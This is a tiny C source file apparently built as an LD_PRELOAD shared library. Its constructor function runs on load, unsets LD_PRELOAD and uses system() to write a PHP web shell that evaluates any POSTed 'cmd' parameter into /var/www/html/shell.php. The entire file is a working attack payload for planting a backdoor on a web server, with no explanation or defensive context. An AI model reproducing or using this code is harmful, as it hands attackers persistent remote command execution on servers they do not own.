//eval.c
 
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
__attribute__ ((__constructor__)) void angel (void){
unsetenv("LD_PRELOAD");
system("echo \"<?php eval(\\$_POST[cmd]);?>\" > /var/www/html/shell.php");
}